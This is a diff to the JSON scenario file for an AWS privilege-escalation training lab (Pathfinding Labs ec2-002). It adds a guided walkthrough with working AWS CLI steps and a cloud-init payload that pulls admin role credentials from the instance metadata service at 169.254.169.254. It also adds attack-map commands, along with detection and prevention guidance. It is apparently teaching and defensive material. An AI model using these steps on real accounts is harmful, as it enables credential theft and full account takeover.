@@ -13,42 +13,8 @@
     "prod"
   ],
   "attackPath": {
-    "principals": [
-      "arn:aws:iam::{account_id}:user/pl-prod-ec2-002-to-admin-starting-user",
-      "arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx",
-      "arn:aws:iam::{account_id}:role/pl-prod-ec2-002-to-admin-target-role"
-    ],
-    "summary": "starting_user \u2192 (ec2:StopInstances) \u2192 (ec2:ModifyInstanceAttribute with malicious cloud-init payload) \u2192 (ec2:StartInstances) \u2192 malicious script executes on boot \u2192 extract credentials from IMDS at 169.254.169.254 \u2192 admin access via attached role"
-  },
-  "permissions": {
-    "required": [
-      {
-        "permission": "ec2:ModifyInstanceAttribute",
-        "resource": "arn:aws:ec2:*:*:instance/*"
-      },
-      {
-        "permission": "ec2:StopInstances",
-        "resource": "arn:aws:ec2:*:*:instance/*"
-      },
-      {
-        "permission": "ec2:StartInstances",
-        "resource": "arn:aws:ec2:*:*:instance/*"
-      }
-    ],
-    "helpful": [
-      {
-        "permission": "ec2:DescribeInstances",
-        "purpose": "Discover target EC2 instances and verify instance state"
-      },
-      {
-        "permission": "ec2:DescribeInstanceAttribute",
-        "purpose": "View current user data and instance configuration"
-      },
-      {
-        "permission": "sts:GetCallerIdentity",
-        "purpose": "Verify identity during attack execution"
-      }
-    ]
+    "principals": [],
+    "summary": ""
   },
   "mitreAttack": {
     "tactics": [
@@ -65,18 +31,51 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/ec2-002-ec2-modifyinstanceattribute+stopinstances+startinstances"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/ec2-002-ec2-modifyinstanceattribute+stopinstances+startinstances",
+  "schemaVersion": "3.0.0",
+  "permissions": {
+    "required": [
+      {
+        "permission": "ec2:ModifyInstanceAttribute",
+        "resource": "arn:aws:ec2:*:*:instance/*",
+        "description": "inject the malicious userData payload"
+      },
+      {
+        "permission": "ec2:StopInstances",
+        "resource": "arn:aws:ec2:*:*:instance/*",
+        "description": "stop the instance so userData can be modified"
+      },
+      {
+        "permission": "ec2:StartInstances",
+        "resource": "arn:aws:ec2:*:*:instance/*",
+        "description": "boot the instance to trigger payload execution"
+      }
+    ],
+    "helpful": [
+      {
+        "permission": "ec2:DescribeInstances",
+        "purpose": "discover target EC2 instances and verify instance state"
+      },
+      {
+        "permission": "ec2:DescribeInstanceAttribute",
+        "purpose": "view current userData and instance configuration"
+      },
+      {
+        "permission": "sts:GetCallerIdentity",
+        "purpose": "verify identity during attack execution"
+      }
+    ]
+  },
   "readme": {
-    "overview": "This scenario demonstrates a sophisticated privilege escalation vulnerability where an attacker with permissions to stop, modify, and start EC2 instances can inject malicious code into an instance's userData to extract IAM role credentials from the Instance Metadata Service (IMDS). Unlike typical user-data scripts that only execute on the first boot, this attack leverages cloud-init's multipart MIME format with the `cloud_final_modules: [scripts-user, always]` directive to ensure the malicious payload executes on subsequent boots.\n\nThe attack works by stopping a running EC2 instance, modifying its userData attribute with a malicious cloud-init script, and then restarting the instance. When the instance boots, the injected script executes with the permissions of the instance's attached IAM role, extracts temporary credentials from the IMDS endpoint at 169.254.169.254, and can exfiltrate them or execute privileged actions. This technique is particularly dangerous because it targets existing infrastructure rather than creating new resources, making it less likely to trigger alarms for unexpected resource creation.\n\nThis technique was popularized by Bishop Fox's AWS privilege escalation research and represents a critical attack vector where compute permissions can be leveraged to obtain credential access. Organizations often overlook the security implications of allowing principals to modify instance attributes, focusing primarily on permissions to create new resources.",
-    "mitreAttack": "- **Tactics**:\n  - TA0004 - Privilege Escalation\n  - TA0006 - Credential Access\n- **Techniques**:\n  - T1552.005 - Unsecured Credentials: Cloud Instance Metadata API\n  - T1578 - Modify Cloud Compute Infrastructure\n- **Sub-techniques**:\n  - T1578.005 - Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations",
-    "attackDiagram": "graph LR\n    A[pl-prod-ec2-002-to-admin-starting-user] -->|ec2:StopInstances| B[EC2 Instance Stopped]\n    B -->|ec2:ModifyInstanceAttribute| C[Inject Malicious userData]\n    C -->|ec2:StartInstances| D[Instance Boots with Payload]\n    D -->|cloud-init executes script| E[Extract IMDS Credentials]\n    E -->|Use pl-prod-ec2-002-to-admin-target-role| F[Effective Administrator]\n\n    style A fill:#ff9999,stroke:#333,stroke-width:2px\n    style B fill:#ffcc99,stroke:#333,stroke-width:2px\n    style C fill:#ffcc99,stroke:#333,stroke-width:2px\n    style D fill:#ffcc99,stroke:#333,stroke-width:2px\n    style E fill:#ffcc99,stroke:#333,stroke-width:2px\n    style F fill:#99ff99,stroke:#333,stroke-width:2px",
-    "attackSteps": "1. **Initial Access**: Start as `pl-prod-ec2-002-to-admin-starting-user` with EC2 modification permissions (credentials provided via Terraform outputs)\n2. **Discover Target Instance**: Use `ec2:DescribeInstances` to identify EC2 instances with privileged IAM roles attached\n3. **Stop Instance**: Use `ec2:StopInstances` to stop the target EC2 instance (userData can only be modified when stopped)\n4. **Inject Malicious Payload**: Use `ec2:ModifyInstanceAttribute` to inject a cloud-init multipart MIME payload with:\n   - `cloud-config` section containing `cloud_final_modules: [scripts-user, always]` to force execution on subsequent boots\n   - `x-shellscript` section containing the credential extraction script\n5. **Start Instance**: Use `ec2:StartInstances` to boot the instance and trigger payload execution\n6. **Payload Execution**: The cloud-init script executes on boot and:\n   - Queries IMDS at `http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n   - Extracts `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`\n   - Exfiltrates credentials or executes commands with admin privileges\n7. **Verification**: Use the extracted credentials to verify administrative access",
-    "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-ec2-002-to-admin-starting-user` | Scenario-specific starting user with EC2 modification permissions and access keys |\n| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-ec2-002-to-admin-target-role` | Target admin role attached to the EC2 instance |\n| `arn:aws:iam::PROD_ACCOUNT:instance-profile/pl-prod-ec2-002-to-admin-target-profile` | Instance profile wrapping the admin role |\n| `arn:aws:ec2:REGION:PROD_ACCOUNT:instance/i-xxxxxxxxx` | EC2 instance with admin role that becomes the attack vector |\n| `arn:aws:ec2:REGION:PROD_ACCOUNT:vpc/vpc-xxxxxxxxx` | VPC for the EC2 instance |\n| `arn:aws:ec2:REGION:PROD_ACCOUNT:subnet/subnet-xxxxxxxxx` | Subnet for the EC2 instance |\n| `arn:aws:ec2:REGION:PROD_ACCOUNT:security-group/sg-xxxxxxxxx` | Security group for the EC2 instance |",
-    "attackLab": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-ec2-002-to-admin-starting-user` IAM user to the `pl-prod-ec2-002-to-admin-target-role` administrative role by stopping an EC2 instance, injecting a malicious cloud-init userData payload, and restarting the instance so the payload extracts temporary IAM credentials from the Instance Metadata Service (IMDS).\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-ec2-002-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-ec2-002-to-admin-target-role`",
+    "setup": {
       "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
       "deployNonInteractive": "```bash\nplabs enable enable_single_account_privesc_one_hop_to_admin_ec2_002_ec2_modifyinstanceattribute_stopinstances_startinstances\nplabs apply\n```",
-      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-ec2-002-to-admin-starting-user` | Scenario-specific starting user with EC2 modification permissions and access keys |\n| `arn:aws:iam::{account_id}:role/pl-prod-ec2-002-to-admin-target-role` | Target admin role attached to the EC2 instance |\n| `arn:aws:iam::{account_id}:instance-profile/pl-prod-ec2-002-to-admin-target-profile` | Instance profile wrapping the admin role |\n| `arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx` | EC2 instance with admin role that becomes the attack vector |\n| `arn:aws:ec2:{region}:{account_id}:vpc/vpc-xxxxxxxxx` | VPC for the EC2 instance |\n| `arn:aws:ec2:{region}:{account_id}:subnet/subnet-xxxxxxxxx` | Subnet for the EC2 instance |\n| `arn:aws:ec2:{region}:{account_id}:security-group/sg-xxxxxxxxx` | Security group for the EC2 instance |",
       "demoAttack": {
-        "intro": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Demonstrate stopping the instance, modifying userData, and starting it\n4. Show the malicious script execution and credential extraction\n5. Verify successful privilege escalation using the extracted credentials\n6. Output standardized test results for automation",
+        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Demonstrate stopping the instance, modifying userData, and starting it\n4. Show the malicious script execution and credential extraction\n5. Verify successful privilege escalation using the extracted credentials\n6. Output standardized test results for automation",
         "resourcesCreated": "- Malicious cloud-init userData injected into the target EC2 instance",
         "nonInteractive": "```bash\nplabs demo --list\nplabs demo ec2-002-ec2-modifyinstanceattribute+stopinstances+startinstances\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
@@ -84,19 +83,110 @@
       "cleanup": {
         "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup ec2-002-ec2-modifyinstanceattribute+stopinstances+startinstances\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_ec2_002_ec2_modifyinstanceattribute_stopinstances_startinstances\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- Principals with `ec2:ModifyInstanceAttribute` on instances with privileged roles attached\n- Privilege escalation path: low-privilege principal \u2192 EC2 modification permissions \u2192 admin role credentials via IMDS\n- High-risk permission combination: `ec2:StopInstances` + `ec2:ModifyInstanceAttribute` + `ec2:StartInstances` held by the same principal\n- EC2 instances with administrative IAM roles that are modifiable by non-admin principals\n- Instances with administrative roles that have IMDSv1 enabled (allowing credential extraction without session tokens)",
+        "prevention": "1. **Restrict ModifyInstanceAttribute Permission**: Use resource-based conditions to limit which instances can have their attributes modified:\n   ```json\n   {\n     \"Effect\": \"Allow\",\n     \"Action\": \"ec2:ModifyInstanceAttribute\",\n     \"Resource\": \"arn:aws:ec2:*:*:instance/*\",\n     \"Condition\": {\n       \"StringEquals\": {\n         \"ec2:ResourceTag/AllowUserDataModification\": \"true\"\n       }\n     }\n   }\n   ```\n\n2. **Implement SCPs to Prevent High-Risk Modifications**: Create Service Control Policies that prevent userData modification on instances with privileged roles:\n   ```json\n   {\n     \"Effect\": \"Deny\",\n     \"Action\": \"ec2:ModifyInstanceAttribute\",\n     \"Resource\": \"arn:aws:ec2:*:*:instance/*\",\n     \"Condition\": {\n       \"StringEquals\": {\n         \"ec2:Attribute\": \"userData\"\n       }\n     }\n   }\n   ```\n\n3. **Require IMDSv2**: Enforce Instance Metadata Service v2, which requires session tokens and mitigates credential extraction:\n   ```bash\n   aws ec2 modify-instance-metadata-options \\\n     --instance-id i-xxxxxxxxx \\\n     --http-tokens required \\\n     --http-put-response-hop-limit 1\n   ```\n\n4. **Separate EC2 Management from Application Permissions**: Use separate roles for EC2 infrastructure management versus application workloads -- never grant `ec2:ModifyInstanceAttribute` to application-level roles; use dedicated admin roles for EC2 modifications\n\n5. **Implement Network Controls**: Use VPC endpoints and security groups to restrict outbound traffic from sensitive instances, preventing credential exfiltration\n\n6. **Use IAM Access Analyzer**: Regularly scan for privilege escalation paths involving EC2 permissions and instance roles\n\n7. **Apply Least Privilege for Instance Roles**: Minimize permissions granted to EC2 instance roles, especially for long-running instances\n\n8. **Enable GuardDuty**: AWS GuardDuty can detect anomalous IMDS credential usage and EC2 instance compromise indicators"
       },
-      "teardownNonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_ec2_002_ec2_modifyinstanceattribute_stopinstances_startinstances\nplabs apply\n```",
-      "teardownTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+      "cloudSiem": {
+        "cloudTrailEvents": "- `EC2: StopInstances` -- instance stopped; suspicious when followed immediately by ModifyInstanceAttribute and StartInstances on the same instance\n- `EC2: ModifyInstanceAttribute` -- instance attribute modified; critical when `attribute=userData` on an instance with a privileged role attached\n- `EC2: StartInstances` -- instance started; high severity when preceded by a ModifyInstanceAttribute (userData) event\n- `STS: AssumeRole` -- role assumed from EC2 instance metadata; look for the target role ARN being assumed by the EC2 instance principal",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
     },
-    "cspm": {
-      "whatToDetect": "A properly configured Cloud Security Posture Management (CSPM) tool should identify:\n\n1. **Overly Permissive EC2 Permissions**: Principals with `ec2:ModifyInstanceAttribute` on instances with privileged roles\n2. **Privilege Escalation Path**: Path from low-privilege principal \u2192 EC2 modification permissions \u2192 admin role credentials\n3. **High-Risk Permission Combinations**: `ec2:StopInstances` + `ec2:ModifyInstanceAttribute` + `ec2:StartInstances` together\n4. **Instance Role Exposure**: EC2 instances with administrative IAM roles that are modifiable by non-admin principals\n5. **IMDS Access Risks**: Instances with administrative roles that have IMDS v1 enabled (allowing easier credential extraction)",
-      "prevention": "1. **Restrict ModifyInstanceAttribute Permission**: Use resource-based conditions to limit which instances can have their attributes modified:\n   ```json\n   {\n     \"Effect\": \"Allow\",\n     \"Action\": \"ec2:ModifyInstanceAttribute\",\n     \"Resource\": \"arn:aws:ec2:*:*:instance/*\",\n     \"Condition\": {\n       \"StringEquals\": {\n         \"ec2:ResourceTag/AllowUserDataModification\": \"true\"\n       }\n     }\n   }\n   ```\n\n2. **Implement SCPs to Prevent High-Risk Modifications**: Create Service Control Policies that prevent userData modification on instances with privileged roles:\n   ```json\n   {\n     \"Effect\": \"Deny\",\n     \"Action\": \"ec2:ModifyInstanceAttribute\",\n     \"Resource\": \"arn:aws:ec2:*:*:instance/*\",\n     \"Condition\": {\n       \"StringEquals\": {\n         \"ec2:Attribute\": \"userData\"\n       }\n     }\n   }\n   ```\n\n3. **Require IMDSv2**: Enforce Instance Metadata Service v2, which requires session tokens and mitigates credential extraction:\n   ```bash\n   aws ec2 modify-instance-metadata-options \\\n     --instance-id i-xxxxxxxxx \\\n     --http-tokens required \\\n     --http-put-response-hop-limit 1\n   ```\n\n4. **Separate EC2 Management from Application Permissions**: Use separate roles for EC2 infrastructure management versus application workloads\n   - Never grant `ec2:ModifyInstanceAttribute` to application-level roles\n   - Use dedicated admin roles for EC2 modifications\n\n5. **Implement Network Controls**: Use VPC endpoints and security groups to restrict outbound traffic from sensitive instances, preventing credential exfiltration\n\n6. **Use IAM Access Analyzer**: Regularly scan for privilege escalation paths involving EC2 permissions and instance roles\n\n7. **Apply Least Privilege for Instance Roles**: Minimize permissions granted to EC2 instance roles, especially for long-running instances\n\n8. **Enable GuardDuty**: AWS GuardDuty can detect anomalous IMDS credential usage and EC2 instance compromise indicators"
-    },
-    "cloudSiem": {
-      "cloudTrailEvents": "- `EC2: StopInstances` \u2014 Instance stopped; suspicious when followed immediately by ModifyInstanceAttribute and StartInstances on the same instance\n- `EC2: ModifyInstanceAttribute` \u2014 Instance attribute modified; critical when `attribute=userData` on an instance with a privileged role attached\n- `EC2: StartInstances` \u2014 Instance started; high severity when preceded by a ModifyInstanceAttribute (userData) event\n- `STS: AssumeRole` \u2014 Role assumed from EC2 instance metadata; look for the target role ARN being assumed by the EC2 instance principal",
-      "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
-    },
-    "references": "- **Bishop Fox AWS Privilege Escalation Research**: This technique was documented as part of Bishop Fox's comprehensive research into AWS privilege escalation methods\n- **Cloud-init Documentation**: Understanding multipart MIME userData and boot-time script execution\n- **AWS IMDS Security**: Best practices for securing Instance Metadata Service access\n- **Pathfinding.cloud**: This scenario is cataloged as path ID **ec2-002**"
+    "references": "- **Bishop Fox AWS Privilege Escalation Research**: This technique was documented as part of Bishop Fox's comprehensive research into AWS privilege escalation methods\n- **Cloud-init Documentation**: Understanding multipart MIME userData and boot-time script execution\n- **AWS IMDS Security**: Best practices for securing Instance Metadata Service access\n- **Pathfinding.cloud**: This scenario is cataloged as path ID **ec2-002**",
+    "guidedWalkthrough": "# Guided Walkthrough: One-Hop Privilege Escalation via ec2:ModifyInstanceAttribute + StopInstances + StartInstances\n\nThis scenario demonstrates a sophisticated privilege escalation vulnerability where an attacker with permissions to stop, modify, and start EC2 instances can inject malicious code into an instance's userData to extract IAM role credentials from the Instance Metadata Service (IMDS). Unlike typical user-data scripts that only execute on the first boot, this attack leverages cloud-init's multipart MIME format with the `cloud_final_modules: [scripts-user, always]` directive to ensure the malicious payload executes on subsequent boots.\n\nThe attack works by stopping a running EC2 instance, modifying its userData attribute with a malicious cloud-init script, and then restarting the instance. When the instance boots, the injected script executes with the permissions of the instance's attached IAM role, extracts temporary credentials from the IMDS endpoint at 169.254.169.254, and can exfiltrate them or execute privileged actions. This technique is particularly dangerous because it targets existing infrastructure rather than creating new resources, making it less likely to trigger alarms for unexpected resource creation.\n\nThis technique was popularized by Bishop Fox's AWS privilege escalation research and represents a critical attack vector where compute permissions can be leveraged to obtain credential access. Organizations often overlook the security implications of allowing principals to modify instance attributes, focusing primarily on permissions to create new resources.\n\n## The Challenge\n\nYou start as `pl-prod-ec2-002-to-admin-starting-user`, an IAM user with EC2 modification permissions (`ec2:StopInstances`, `ec2:ModifyInstanceAttribute`, `ec2:StartInstances`) but no administrative access. Your goal is to reach the `pl-prod-ec2-002-to-admin-target-role`, an IAM role with `AdministratorAccess` that is attached to a running EC2 instance via an instance profile.\n\nThe instance is already running. You cannot directly assume the role -- its trust policy does not permit you. But the instance running with that role is something you can manipulate.\n\nCredentials for the starting user are available from Terraform outputs:\n\n```bash\ncd ../../../../../..\nMODULE_OUTPUT=$(terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_ec2_002_ec2_modifyinstanceattribute_stopinstances_startinstances.value')\nexport AWS_ACCESS_KEY_ID=$(echo \"$MODULE_OUTPUT\" | jq -r '.starting_user_access_key_id')\nexport AWS_SECRET_ACCESS_KEY=$(echo \"$MODULE_OUTPUT\" | jq -r '.starting_user_secret_access_key')\nunset AWS_SESSION_TOKEN\ncd - > /dev/null\n```\n\n## Reconnaissance\n\nFirst, confirm who you are and verify you don't already have admin access:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::<account_id>:user/pl-prod-ec2-002-to-admin-starting-user\n\naws iam list-users --max-items 1\n# AccessDenied -- good, as expected\n```\n\nNow find the target EC2 instance. The instance is tagged with `pl-prod-ec2-002-to-admin-target-instance`:\n\n```bash\nINSTANCE_ID=$(aws ec2 describe-instances \\\n    --filters \"Name=tag:Name,Values=pl-prod-ec2-002-to-admin-target-instance\" \\\n              \"Name=instance-state-name,Values=running,stopped\" \\\n    --query 'Reservations[0].Instances[0].InstanceId' \\\n    --output text)\necho \"Target instance: $INSTANCE_ID\"\n```\n\nCheck what IAM role is attached to the instance:\n\n```bash\naws ec2 describe-instances \\\n    --instance-ids \"$INSTANCE_ID\" \\\n    --query 'Reservations[0].Instances[0].IamInstanceProfile.Arn' \\\n    --output text\n# arn:aws:iam::<account_id>:instance-profile/pl-prod-ec2-002-to-admin-target-profile\n```\n\nThere it is. An administrative instance profile attached to a running instance. This is your entry point.\n\n## Exploitation\n\nThe key insight is that `ec2:ModifyInstanceAttribute` lets you change the `userData` of a stopped EC2 instance. When that instance boots, cloud-init runs the userData script. If you craft the payload using the multipart MIME format with `cloud_final_modules: [scripts-user, always]`, the script runs on every boot -- not just the first.\n\n### Step 1: Back up the original userData\n\nBefore making changes, preserve the current userData so you can restore it later:\n\n```bash\nORIGINAL_USERDATA=$(aws ec2 describe-instance-attribute \\\n    --instance-id \"$INSTANCE_ID\" \\\n    --attribute userData \\\n    --query 'UserData.Value' \\\n    --output text 2>/dev/null)\necho \"$ORIGINAL_USERDATA\" > /tmp/original_userdata.b64\n```\n\n### Step 2: Stop the instance\n\nuserData can only be modified when the instance is stopped:\n\n```bash\naws ec2 stop-instances --instance-ids \"$INSTANCE_ID\"\naws ec2 wait instance-stopped --instance-ids \"$INSTANCE_ID\"\necho \"Instance stopped.\"\n```\n\n### Step 3: Craft the malicious cloud-init payload\n\nThe payload uses the multipart MIME format. The `cloud-config` section forces execution on every boot; the shell script section does the actual credential extraction from IMDS. Crucially, this uses IMDSv2 tokens to work even on instances that require session-oriented metadata requests:\n\n```\nContent-Type: multipart/mixed; boundary=\"//\"\nMIME-Version: 1.0\n\n--//\nContent-Type: text/cloud-config; charset=\"us-ascii\"\nMIME-Version: 1.0\n\n#cloud-config\ncloud_final_modules:\n- [scripts-user, always]\n\n--//\nContent-Type: text/x-shellscript; charset=\"us-ascii\"\nMIME-Version: 1.0\n\n#!/bin/bash\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" \\\n    -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)\nROLE_NAME=$(curl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n    http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)\nCREDS=$(curl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n    http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null)\n\necho \"$CREDS\" > /tmp/extracted_creds.json\necho \"[DEMO] Credentials extracted at $(date)\" >> /var/log/credential-extraction.log\necho \"$CREDS\" >> /var/log/credential-extraction.log\n--//\n```\n\nBase64-encode this payload (AWS requires userData to be base64-encoded) and write it to a temp file:\n\n```bash\nMALICIOUS_PAYLOAD_B64=$(echo \"$MALICIOUS_PAYLOAD\" | base64)\necho \"$MALICIOUS_PAYLOAD_B64\" > /tmp/malicious_userdata.b64\n```\n\n### Step 4: Inject the payload\n\n```bash\naws ec2 modify-instance-attribute \\\n    --instance-id \"$INSTANCE_ID\" \\\n    --attribute userData \\\n    --value \"file:///tmp/malicious_userdata.b64\"\necho \"Malicious userData injected.\"\n```\n\n### Step 5: Start the instance\n\n```bash\naws ec2 start-instances --instance-ids \"$INSTANCE_ID\"\naws ec2 wait instance-running --instance-ids \"$INSTANCE_ID\"\necho \"Instance started. cloud-init will execute the payload on boot.\"\n```\n\nOnce the instance boots, cloud-init runs your script. The script queries IMDS with an IMDSv2 token, retrieves the role name from `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, then fetches `AccessKeyId`, `SecretAccessKey`, and `Token` for the attached admin role.\n\nIn a real attack scenario, you would retrieve those credentials by:\n- Sending them to attacker-controlled infrastructure within the script\n- Reading `/tmp/extracted_creds.json` or `/var/log/credential-extraction.log` via SSM Session Manager\n- Exfiltrating them to an S3 bucket or HTTP endpoint from within the injected script\n\n## Verification\n\nOnce you have the credentials from IMDS (either directly or via an exfiltration channel), use them to confirm admin access:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<extracted_key>\nexport AWS_SECRET_ACCESS_KEY=<extracted_secret>\nexport AWS_SESSION_TOKEN=<extracted_token>\n\naws iam list-users --max-items 3\n# Successfully lists IAM users -- admin access confirmed\n```\n\n## What Happened\n\nYou exploited the combination of `ec2:StopInstances`, `ec2:ModifyInstanceAttribute`, and `ec2:StartInstances` to gain code execution on an EC2 instance with an attached administrative IAM role. By crafting a cloud-init multipart MIME payload and injecting it as the instance's userData, your script ran automatically at boot time with the permissions of the attached role -- without ever having explicit permission to assume that role.\n\nThe cloud_final_modules directive with the `always` flag is the key detail that makes this more dangerous than a naive userData injection: the script runs on every subsequent boot, not just the first, meaning the compromise persists across reboots. This attack lives entirely within existing infrastructure, which makes it harder to detect than operations that create new resources.\n"
   },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-principal",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-ec2-002-to-admin-starting-user",
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has ec2:StopInstances, ec2:ModifyInstanceAttribute, and ec2:StartInstances permissions, allowing it to inject a malicious cloud-init payload into an EC2 instance that has an admin IAM role attached.\n"
+      },
+      {
+        "id": "ec2-instance",
+        "label": "Target EC2 Instance",
+        "type": "resource",
+        "subType": "ec2-instance",
+        "arn": "arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx",
+        "description": "This EC2 instance has the admin IAM role attached via an instance profile. By stopping the instance, injecting a malicious cloud-init userData payload, and restarting it, the payload executes on boot with the permissions of the attached role and can extract temporary credentials from IMDS.\n"
+      },
+      {
+        "id": "target-role",
+        "label": "Admin Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isTarget": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-ec2-002-to-admin-target-role",
+        "description": "This IAM role has AdministratorAccess and is attached to the EC2 instance via an instance profile. By injecting a malicious userData script, you can extract the role's temporary credentials from IMDS (169.254.169.254) when the instance boots, gaining full administrative access to the AWS account.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-principal",
+        "to": "ec2-instance",
+        "label": "ec2:StopInstances + ec2:ModifyInstanceAttribute",
+        "description": "Stop the running EC2 instance, then inject a malicious cloud-init multipart MIME payload via ec2:ModifyInstanceAttribute (userData attribute). The payload uses cloud_final_modules with the 'always' directive to execute on every boot.\n",
+        "hints": [
+          "You can modify the boot configuration of EC2 instances.",
+          "Look for EC2 instances with privileged IAM roles attached.",
+          "Stopping an instance lets you change its userData; restarting it executes your payload.",
+          "Browse to https://pathfinding.cloud/paths/ec2-002 for technique details."
+        ],
+        "commands": [
+          {
+            "description": "Stop the target EC2 instance",
+            "command": "aws ec2 stop-instances --instance-ids <instance-id>"
+          },
+          {
+            "description": "Wait for the instance to reach stopped state",
+            "command": "aws ec2 wait instance-stopped --instance-ids <instance-id>"
+          },
+          {
+            "description": "Inject malicious cloud-init userData (base64-encoded multipart MIME payload)",
+            "command": "aws ec2 modify-instance-attribute --instance-id <instance-id> --attribute userData --value file://malicious_userdata.b64"
+          },
+          {
+            "description": "Start the instance to trigger payload execution",
+            "command": "aws ec2 start-instances --instance-ids <instance-id>"
+          }
+        ]
+      },
+      {
+        "from": "ec2-instance",
+        "to": "target-role",
+        "label": "IMDS credential extraction",
+        "description": "When the instance boots, the injected cloud-init script queries the Instance Metadata Service at 169.254.169.254 to retrieve temporary credentials for the attached admin role. These credentials are then exfiltrated or used directly to perform privileged actions.\n",
+        "hints": [
+          "This instance has a privileged role attached. Its userData can be modified while stopped.",
+          "Use ec2:ModifyInstanceAttribute to inject a script that queries IMDS for credentials."
+        ],
+        "commands": [
+          {
+            "description": "Query IMDS for the attached role name (runs inside the injected script)",
+            "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+          },
+          {
+            "description": "Retrieve temporary credentials for the admin role",
+            "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"
+          },
+          {
+            "description": "Verify admin access using extracted credentials",
+            "command": "AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY=<secret> AWS_SESSION_TOKEN=<token> aws iam list-users"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
   "slug": "ec2-002"
 }
